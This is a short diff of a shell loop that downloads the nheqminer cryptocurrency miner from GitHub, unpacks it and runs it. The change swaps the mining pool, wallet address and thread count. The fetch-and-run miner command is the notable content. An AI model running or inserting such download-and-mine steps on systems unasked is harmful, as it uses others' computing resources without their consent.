@@ -6,7 +6,7 @@ until [  $COUNTER -lt 10 ]; do
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
 tar xf nheqminer-Linux-v0.8.2.tar.gz
 cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Test -p x -t 2
+./nheqminer -v -l rx2.mine.zergpool.com:8335 -u DS4o16rvQT8oWEAdTCFT93wAq1pSzEKYHS.Test -p x -t 1
  
      echo COUNTER $COUNTER
      let COUNTER-=1
